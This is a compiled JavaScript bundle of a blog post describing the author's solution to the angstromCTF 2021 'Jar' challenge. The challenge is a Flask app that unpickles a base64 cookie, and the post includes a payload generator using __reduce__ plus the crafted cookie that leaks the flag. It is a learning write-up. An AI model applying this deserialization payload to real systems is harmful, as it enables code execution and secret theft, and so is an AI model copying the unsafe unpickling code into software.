"use strict";(self.webpackChunkkgkb=self.webpackChunkkgkb||[]).push([[56952],{11024:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>r,contentTitle:()=>a,default:()=>h,frontMatter:()=>s,metadata:()=>l,toc:()=>c});var o=n(74848),i=n(28453);const s={slug:"angstrom-ctf2021-exploiting-python-pickle-in-flask",title:"Angstrom CTF2021 | Exploiting Python Pickle in Flask Web\xa0App",description:"Fill me up!",authors:["kbbgl"],tags:["ctf","python","security","web"]},a=void 0,l={permalink:"/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask",source:"@site/blog/angstrom-ctf2021-exploiting-python-pickle-in-flask.md",title:"Angstrom CTF2021 | Exploiting Python Pickle in Flask Web\xa0App",description:"Fill me up!",date:"2025-06-03T19:59:20.000Z",tags:[{inline:!1,label:"Ctf",permalink:"/blog/tags/ctf"},{inline:!1,label:"Python",permalink:"/blog/tags/python"},{inline:!1,label:"Security",permalink:"/blog/tags/security"},{inline:!1,label:"Web",permalink:"/blog/tags/web"}],readingTime:10.445,hasTruncateMarker:!0,authors:[{name:"Kobbi Gal",title:"I like to pick things apart and see how they work inside",url:"https://github.com/kbbgl",imageURL:"https://avatars.githubusercontent.com/u/14372649",key:"kbbgl",page:null}],frontMatter:{slug:"angstrom-ctf2021-exploiting-python-pickle-in-flask",title:"Angstrom CTF2021 | Exploiting Python Pickle in Flask Web\xa0App",description:"Fill me up!",authors:["kbbgl"],tags:["ctf","python","security","web"]},unlisted:!1,prevItem:{title:"3-Way Data Migration between Support\xa0Systems",permalink:"/blog/3-way-data-migration-between-support-systems"},nextItem:{title:"How To Catch EBUSY Event on Windows using NodeJS",permalink:"/blog/catch-ebusy-on-nodejs"}},r={authorsImageUrls:[void 0]},c=[{value:"Introduction",id:"introduction",level:2},{value:"Initial Setup",id:"initial-setup",level:2},{value:"Reviewing the Flask Server Code",id:"reviewing-the-flask-server-code",level:2},{value:"<code>pickle</code> Research and Breakthrough",id:"pickle-research-and-breakthrough",level:2},{value:"Generating the Cookie to Expose the Flag",id:"generating-the-cookie-to-expose-the-flag",level:2},{value:"Reassembling the Flag",id:"reassembling-the-flag",level:2}];function d(e){const t={a:"a",blockquote:"blockquote",code:"code",h2:"h2",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(t.h2,{id:"introduction",children:"Introduction"}),"\n",(0,o.jsxs)(t.p,{children:["Recently, I became interested in understanding a bit more about web application exploitation. This interest evolved with my daily work with web applications over the last few years, reviewing already developed web application source code, modifying it at times in order to resolve a customer issue and needing to dive deep and debug customer problems in production.\nBut I always felt that my daily work was only focusing on how to resolve an issue for a customer. I never branched out to actually understanding the security behind the web applications and services I\u2019m debug and the code I was reviewing and modifying. Moreover, I felt that I was not able to identify any security vulnerabilities in the applications I was working with.\nSo I challenged to take this next step in learning more about web application security vulnerabilities by signing up to ",(0,o.jsx)(t.a,{href:"https://2021.angstromctf.com",children:"\xe5ngstromCTF 2021"}),", an annual capture-the-flag competition hosted by Montgomery Blair High School (ironically located very near to the high school I attended in Maryland).\nThis post describes the process by which I was able to finish one of the challenges called Jar under the Web category."]}),"\n",(0,o.jsx)(t.h2,{id:"initial-setup",children:"Initial Setup"}),"\n",(0,o.jsx)(t.p,{children:"When clicking on the particular challenge, you are presented with the following modal:"}),"\n",(0,o.jsx)(t.p,{children:(0,o.jsx)(t.img,{alt:"modal",src:n(46091).A+"",width:"1901",height:"1013"})}),"\n",(0,o.jsxs)(t.p,{children:["It includes a link to the web application, a ",(0,o.jsx)(t.code,{children:"Dockerfile"}),", ",(0,o.jsx)(t.code,{children:"jar.py"})," and an image of a pickle (",(0,o.jsx)(t.code,{children:"pickle.jpg"}),"). I downloaded all files, opened the directory in Visual Studio Code, built and ran the docker image:"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"mkdir jar\ncd jar\ncode -a .\nwget https://files.actf.co/fbb50c51e4eb57abfac63ea2000aad91a62b804d0e6be1d7b95ba369af0f1d1c/jar.py\n \nwget https://files.actf.co/fbb50c51e4eb57abfac63ea2000aad91a62b804d0e6be1d7b95ba369af0f1d1c/Dockerfile\n \nwget https://files.actf.co/fbb50c51e4eb57abfac63ea2000aad91a62b804d0e6be1d7b95ba369af0f1d1c/pickle.jpg\n \ndocker build . -t ctf2021-web-jar\ndocker run --net host -p 5000:5000 $IMAGE_ID\n"})}),"\n",(0,o.jsx)(t.p,{children:"And loaded the application on my browser:"}),"\n",(0,o.jsx)(t.p,{children:(0,o.jsx)(t.img,{alt:"app_load",src:n(41302).A+"",width:"1918",height:"1015"})}),"\n",(0,o.jsx)(t.p,{children:"We\u2019re introduced to a stretched-out image of the pickle and an input box. Adding any text to the input box generates a REST API POST request to the Flask server and adds a text node over the pickle image:"}),"\n",(0,o.jsx)(t.p,{children:(0,o.jsx)(t.img,{alt:"tests",src:n(52787).A+"",width:"1915",height:"1014"})}),"\n",(0,o.jsx)(t.p,{children:"I added 3 text for testing purposes: \u2018admin\u2019, 'test2\u2019, \u2018really ugly ui\u2019 (I hope you agree that it is)."}),"\n",(0,o.jsx)(t.h2,{id:"reviewing-the-flask-server-code",children:"Reviewing the Flask Server Code"}),"\n",(0,o.jsx)(t.p,{children:"The Flask server code is pretty simple. It has 3 routes:"}),"\n",(0,o.jsxs)(t.ul,{children:["\n",(0,o.jsxs)(t.li,{children:[(0,o.jsx)(t.code,{children:"GET /"})," - The root path."]}),"\n",(0,o.jsxs)(t.li,{children:[(0,o.jsx)(t.code,{children:"GET ./pickle.jpg"})," - Sends back the image to the frontend."]}),"\n",(0,o.jsxs)(t.li,{children:[(0,o.jsx)(t.code,{children:"POST /add"})," - The path where the payload is sent when a new word is added in the input box."]}),"\n"]}),"\n",(0,o.jsx)(t.p,{children:"I focused my attention on the latter two routes as the exploit was likely to be found there. Here\u2019s the code for both:"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-python",children:"@app.route('/')\ndef jar():\n    contents = request.cookies.get('contents')\n    if contents: items = pickle.loads(base64.b64decode(contents))\n    else: items = []\n    return '<form method=\"post\" action=\"/add\" style=\"text-align: center; width: 100%\"><input type=\"text\" name=\"item\" placeholder=\"Item\"><button>Add Item</button><img style=\"width: 100%; height: 100%\" src=\"/pickle.jpg\">' + \\\n        ''.join(f'<div style=\"background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;\">{item}</div>' for item in items)\n \n@app.route('/add', methods=['POST'])\ndef add():\n    contents = request.cookies.get('contents')\n    if contents: items = pickle.loads(base64.b64decode(contents))\n    else: items = []\n    items.append(request.form['item'])\n    response = make_response(redirect('/'))\n    response.set_cookie('contents', base64.b64encode(pickle.dumps(items)))\n    return response\n"})}),"\n",(0,o.jsx)(t.p,{children:"The root route basically retrieves the client cookie named contents and returns  hardcoded HTML back to the client with a list of items (or an empty list if there are no items)."}),"\n",(0,o.jsxs)(t.p,{children:["The ",(0,o.jsx)(t.code,{children:"/add"})," route is responsible for appending a new item to the list of items and setting the cookie.\nWhat is common to both methods/routes is that they both decode the ",(0,o.jsx)(t.code,{children:"base64"})," cookie and load/dump using the ",(0,o.jsx)(t.code,{children:"pickle"})," library."]}),"\n",(0,o.jsxs)(t.p,{children:["I\u2019ve worked with the ",(0,o.jsx)(t.a,{href:"https://docs.python.org/3/library/pickle.html",children:(0,o.jsx)(t.code,{children:"pickle"})})," library before but not to the extent that I understood completely how it worked. So I turned to the official documentation to review how it performs its de/serialization."]}),"\n",(0,o.jsxs)(t.h2,{id:"pickle-research-and-breakthrough",children:[(0,o.jsx)(t.code,{children:"pickle"})," Research and Breakthrough"]}),"\n",(0,o.jsx)(t.p,{children:"The first thing I noticed when I accessed the pickle documentation was the following big red warning sign:"}),"\n",(0,o.jsxs)(t.blockquote,{children:["\n",(0,o.jsxs)(t.p,{children:["The ",(0,o.jsx)(t.code,{children:"pickle"})," module is not secure. Only un",(0,o.jsx)(t.code,{children:"pickle"})," data you trust.\nIt is possible to construct malicious pickle data which will ",(0,o.jsx)(t.strong,{children:"execute arbitrary code during unpickling"}),". Never unpickle data that could have come from an untrusted source, or that could have been tampered with."]}),"\n"]}),"\n",(0,o.jsxs)(t.p,{children:["Sounds like this is where we should focus on. If we review the Flask server code, the logic inside the method serving the root path (",(0,o.jsx)(t.code,{children:"def jar"}),") ",(0,o.jsx)(t.code,{children:"base64"})," decodes the cookie and loads it using the ",(0,o.jsx)(t.code,{children:"pickle"})," module. This means that if we can somehow tamper with the cookie, we could potentially generate a malicious payload to break the app and capture the flag.\nWe can access the cookie from the browser using JavaScript:"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-javascript",children:'document.cookie\n"contents=gASVJgAAAAAAAABdlCiMBWtvYmJplIwFdGVzdDKUjA5yZWFsbHkgdWdseSB1aZRlLg=="\n\ndocument.cookie.split("=")[1]\n \n"gASVJgAAAAAAAABdlCiMBWtvYmJplIwFdGVzdDKUjA5yZWFsbHkgdWdseSB1aZRlLg=="\n'})}),"\n",(0,o.jsxs)(t.p,{children:["Since we know that this string representing the cookie is ",(0,o.jsx)(t.code,{children:"base64"})," (not only because of the Python code we reviewed but also because it has the famous \u2018==\u2018 suffix), we can decode it and understand it\u2019s structure.\nI saved the string into a file called ",(0,o.jsx)(t.code,{children:"cookie"})," and proceeded to ",(0,o.jsx)(t.code,{children:"base64"})," decoded it and pipe it into another file called ",(0,o.jsx)(t.code,{children:"cookie_decoded"}),":"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:'echo "gASVJgAAAAAAAABdlCiMBWtvYmJplIwFdGVzdDKUjA5yZWFsbHkgdWdseSB1aZRlLg==" > cookie\n \nbase64 -d cookie > cookie_decoded\n'})}),"\n",(0,o.jsxs)(t.p,{children:["When printing the contents of ",(0,o.jsx)(t.code,{children:"cookie_decoded"}),", the output had the text I\u2019ve added to the input field surrounded by some unrecognizable characters:"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"cat cookie_decoded\n \n\ufffd\ufffd&]\ufffd(\ufffdkobbi\ufffd\ufffdtest2\ufffd\ufffdreally ugly ui\ufffde.%\n"})}),"\n",(0,o.jsxs)(t.p,{children:["So it seems that there\u2019s another layer of decoding to the file. Upon further research, I found a ",(0,o.jsxs)(t.a,{href:"https://docs.python.org/3/library/pickletools.html",children:["set of tools called ",(0,o.jsx)(t.code,{children:"pickletools"})]})," that were able to disassemble a pickle file, which is what I believed I had in the string representation of ",(0,o.jsx)(t.code,{children:"cookie_decoded"}),".\nI ran the following command to understand how to work with ",(0,o.jsx)(t.code,{children:"pickletools"}),":"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"python3 -m pickletools\nusage: pickletools.py [-h] [-o OUTPUT] [-m] [-l INDENTLEVEL] [-a] [-p PREAMBLE] [-t] [-v] [pickle_file ...]\n \ndisassemble one or more pickle files\n \npositional arguments:\n  pickle_file           the pickle file\n \n# ...\n"})}),"\n",(0,o.jsx)(t.p,{children:"So it looks like it accepts a file as a positional argument. Therefore I ran:"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"python3 -m pickletools cookie_decoded\n \n    0: \\x80 PROTO      4\n    2: \\x95 FRAME      38\n   11: ]    EMPTY_LIST\n   12: \\x94 MEMOIZE    (as 0)\n   13: (    MARK\n   14: \\x8c     SHORT_BINUNICODE 'kobbi'\n   21: \\x94     MEMOIZE    (as 1)\n   22: \\x8c     SHORT_BINUNICODE 'test2'\n   29: \\x94     MEMOIZE    (as 2)\n   30: \\x8c     SHORT_BINUNICODE 'really ugly ui'\n   46: \\x94     MEMOIZE    (as 3)\n   47: e        APPENDS    (MARK at 13)\n   48: .    STOP\nhighest protocol among opcodes = 4\n"})}),"\n",(0,o.jsxs)(t.p,{children:["To translate the output, I needed to review the ",(0,o.jsx)(t.a,{href:"https://github.com/python/cpython/blob/master/Lib/pickletools.py",children:"pickletools source code"}),". The most important parts of the source file are in the comments and describe the data structure of the ",(0,o.jsx)(t.code,{children:"pickle"})," and are included below:"]}),"\n",(0,o.jsxs)(t.blockquote,{children:["\n",(0,o.jsx)(t.p,{children:'"A pickle" is a program for a virtual pickle machine (PM, but more accurately called an unpickling machine).  It\'s a sequence of opcodes, interpreted by the PM, building an arbitrarily complex Python object.'}),"\n"]}),"\n",(0,o.jsxs)(t.blockquote,{children:["\n",(0,o.jsx)(t.p,{children:"Opcodes are executed once each, from first to last, until a STOP opcode is reached."}),"\n"]}),"\n",(0,o.jsxs)(t.blockquote,{children:["\n",(0,o.jsx)(t.p,{children:'The PM has two data areas, "the stack" and "the memo".'}),"\n"]}),"\n",(0,o.jsxs)(t.blockquote,{children:["\n",(0,o.jsx)(t.p,{children:"Many opcodes push Python objects onto the stack"}),"\n"]}),"\n",(0,o.jsxs)(t.blockquote,{children:["\n",(0,o.jsx)(t.p,{children:"Other opcodes take Python objects off the stack.  The result of unpickling is whatever object is left on the stack when the final STOP opcode is executed."}),"\n"]}),"\n",(0,o.jsxs)(t.blockquote,{children:["\n",(0,o.jsx)(t.p,{children:'The memo is simply an array of objects, or it can be implemented as a dict mapping little integers to objects.  The memo serves as the PM\'s "long term memory", and the little integers indexing the memo are akin to variable names.  Some opcodes pop a stack object into the memo at a given index, and others push a memo object at a given index onto the stack again.'}),"\n"]}),"\n",(0,o.jsxs)(t.blockquote,{children:["\n",(0,o.jsxs)(t.p,{children:["opcodes description\n",(0,o.jsx)(t.code,{children:"PROTO"})," - A way for a pickle to identify its protocol.\n",(0,o.jsx)(t.code,{children:"FRAME"})," - The unpickler may use this opcode to safely prefetch data from its underlying stream.\n",(0,o.jsx)(t.code,{children:"EMPTY_LIST"})," - creates a list.\n",(0,o.jsx)(t.code,{children:"MARK"})," - Push markobject onto the stack.\n",(0,o.jsx)(t.code,{children:"MEMOIZE"})," - Store the stack top into the memo.  The stack is not popped. The index of the memo location to write is the number of elements currently present in the memo.\n",(0,o.jsx)(t.code,{children:"SHORT_BINUNICODE"})," - Push a Python Unicode string object.\n",(0,o.jsx)(t.code,{children:"APPENDS"})," - Extend a list by a slice of stack objects\n",(0,o.jsx)(t.code,{children:"STOP"})," - Stop the unpickling machine."]}),"\n"]}),"\n",(0,o.jsxs)(t.p,{children:["After reading the documentation in detail, we are able to decypher what the output instructions of the assembly behind the ",(0,o.jsx)(t.code,{children:"pickle"})," actually mean:"]}),"\n",(0,o.jsxs)(t.ol,{children:["\n",(0,o.jsx)(t.li,{children:"The protocol used by this pickle is 4."}),"\n",(0,o.jsxs)(t.li,{children:["The size of the frame coming from the stream (represented by the bytes from the ",(0,o.jsx)(t.code,{children:"cookie_decoded"})," file) is 38 bytes long."]}),"\n",(0,o.jsx)(t.li,{children:"Generate and push a new empty list to the stack."}),"\n",(0,o.jsx)(t.li,{children:"Store the stack top into the memory at index 0."}),"\n",(0,o.jsxs)(t.li,{children:["Push the ",(0,o.jsx)(t.code,{children:"markobject"})," (a special object that marks the current instruction similar to the CIR register in CPU control unit) onto the stack."]}),"\n",(0,o.jsx)(t.li,{children:"Push the string \u2018kobbi\u2019 into the onto the stack."}),"\n",(0,o.jsx)(t.li,{children:"Store the stack top into the memo at index 1."}),"\n",(0,o.jsx)(t.li,{children:"Repeat instruction 6 and 7 for \u2018test2\u2019 and \u2018really ugly ui\u2019 strings with indices 2,3 respectively."}),"\n",(0,o.jsx)(t.li,{children:"Extend the list holding the strings."}),"\n",(0,o.jsx)(t.li,{children:"Stop the PM."}),"\n"]}),"\n",(0,o.jsx)(t.p,{children:"Great, so now that we have the instructions, what\u2019s next? Well, we need to figure out how to generate a cookie string that will include a command to read the environmental variable where the cookie value is held and when unpickled, will spit out the flag."}),"\n",(0,o.jsx)(t.h2,{id:"generating-the-cookie-to-expose-the-flag",children:"Generating the Cookie to Expose the Flag"}),"\n",(0,o.jsx)(t.p,{children:"Now that we have a greater understanding what the pickle assembly looks like, the next step would be to find a way to generate a payload that when unpickled, would expose the flag we need to complete the assignment.\nIf we review the source code of the Flask server, we can see that the flag is held in an environmental variable:"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-python",children:"flag = os.environ.get('FLAG', 'actf{FAKE_FLAG}')\n"})}),"\n",(0,o.jsx)(t.p,{children:"So in whatever payload we generate, we would need to run a system call to read the environmental variable, probably something like this:"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-python",children:"os.getenv('FLAG')\n"})}),"\n",(0,o.jsx)(t.p,{children:"That\u2019s the easy part. But how do we generate the payload and insert this command within the bytecode of the cookie to be unpickled?"}),"\n",(0,o.jsxs)(t.p,{children:["After some research, I found ",(0,o.jsxs)(t.a,{href:"https://davidhamann.de/2020/04/05/exploiting-python-pickle/",children:["the following article describing how we can use the ",(0,o.jsx)(t.code,{children:"reduce"})," method to append additional commands to the bytecode payload"]}),". The appended command will be used for retrieving the ",(0,o.jsx)(t.code,{children:"FLAG"})," environmental variable.\nI used the article to write a script to generate the bytecode payload, modifying it to suit my needs (the author needed to run some commands and get back a reverse shell, here we\u2019re only interested in getting the ",(0,o.jsx)(t.code,{children:"FLAG"})," environmental variable). This is the script called ",(0,o.jsx)(t.code,{children:"payloadgen.py"}),":"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-python",children:"import pickle\nimport base64\nimport os\n \nclass PayloadGen(object):\n   def __reduce__(self):\n      return (os.getenv, ('FLAG',))\n \nif __name__ == '__main__':\n   dmp = pickle.dumps(PayloadGen())\n   print(base64.urlsafe_b64encode(dmp))\n"})}),"\n",(0,o.jsxs)(t.p,{children:["I\u2019m using ",(0,o.jsx)(t.code,{children:"urlsafe_b64encode"})," here because I want to ensure that the generated encoded payload is URL safe. Also, the extra comma in ",(0,o.jsx)(t.code,{children:"('FLAG',)"})," is there because the second item of the tuple returned by ",(0,o.jsx)(t.code,{children:"reduce"})," must be a ",(0,o.jsx)(t.code,{children:"tuple"})," as well.\nI then ran the script:"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-bash",children:"python3 payloadgen.py\nb'gASVHAAAAAAAAACMAm9zlIwGZ2V0ZW52lJOUjARGTEFHlIWUUpQu'\n"})}),"\n",(0,o.jsx)(t.p,{children:"Nice! If we take the value \u2018gASVHAAAAAAAAACMAm9zlIwGZ2V0ZW52lJOUjARGTEFHlIWUUpQu\u2018 and set the cookie to it and refresh the page, we get a scrambled set of letters which is likely our flag!"}),"\n",(0,o.jsx)(t.p,{children:(0,o.jsx)(t.img,{src:"https://tilsupport.files.wordpress.com/2021/04/image-5.png",alt:"scrambled"})}),"\n",(0,o.jsx)(t.p,{children:"The last piece of the puzzle is to figure out the correct order of the flag and reassemble it."}),"\n",(0,o.jsx)(t.h2,{id:"reassembling-the-flag",children:"Reassembling the Flag"}),"\n",(0,o.jsxs)(t.p,{children:["If we look at the image above, we can see that the letters of the flag are displayed on the site in an unordered manner. When refreshing the page, the letters will be shuffled to a different order. By reviewing the HTML returned by the root path, we see that the method returns a random positioning for each ",(0,o.jsx)(t.code,{children:"div"})," item:"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-css",children:"top: {random.random()*100}%;\nleft: {random.random()*100}%;\n"})}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-python",children:'return \'<form method="post" action="/add" style="text-align: center; width: 100%"><input type="text" name="item" placeholder="Item"><button>Add Item</button><img style="width: 100%; height: 100%" src="/pickle.jpg">\' + \\\n        \'\'.join(f\'<div style="background-color: white; font-size: 3em; position: absolute; top: {random.random()*100}%; left: {random.random()*100}%;">{item}</div>\' for item in items)\n'})}),"\n",(0,o.jsxs)(t.p,{children:["But, what we notice here is that the ",(0,o.jsx)(t.code,{children:"for"})," loop (",(0,o.jsx)(t.code,{children:"for item in items"}),") iteration is actually done in an ordered manner, which should simplify figuring out how to reassemble the flag text. So I reviewed the HTML of the page and found that the items are, as expected, positioned in an ordered manner (all Angstrom CTF flags have the following standard structure: ",(0,o.jsx)(t.code,{children:"actf{}"}),"):"]}),"\n",(0,o.jsx)(t.p,{children:(0,o.jsx)(t.img,{src:"https://tilsupport.files.wordpress.com/2021/04/image-6.png",alt:"scramble-2"})}),"\n",(0,o.jsxs)(t.p,{children:["So we could just manually take each ",(0,o.jsx)(t.code,{children:"div"})," value and construct the flag. But the more elegant way would be to use some JavaScript to construct the flag:"]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-javascript",children:'var letters = document.getElementByTagName("div")\nvar flag = ""\n \nfor (var i = 0; i < letters.length; i++){\n   flag += letters[i].innerText;\n}\n'})}),"\n",(0,o.jsx)(t.p,{children:"Which outputs the flag:"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-javascript",children:"flag\n\nactf{you_got_yourself_out_of_a_pickle}\n"})})]})}function h(e={}){const{wrapper:t}={...(0,i.R)(),...e.components};return t?(0,o.jsx)(t,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},41302:(e,t,n)=>{n.d(t,{A:()=>o});const o=n.p+"assets/images/app_load-cd224a65e8401934414d4d0623f48b2c.png"},46091:(e,t,n)=>{n.d(t,{A:()=>o});const o=n.p+"assets/images/modal-eae7974c81cadde35073fa353aa304b1.png"},52787:(e,t,n)=>{n.d(t,{A:()=>o});const o=n.p+"assets/images/tests-28f40c93b02b7f840d8c399aba9cc4f5.png"},28453:(e,t,n)=>{n.d(t,{R:()=>a,x:()=>l});var o=n(96540);const i={},s=o.createContext(i);function a(e){const t=o.useContext(s);return o.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function l(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),o.createElement(s.Provider,{value:t},e.children)}}}]);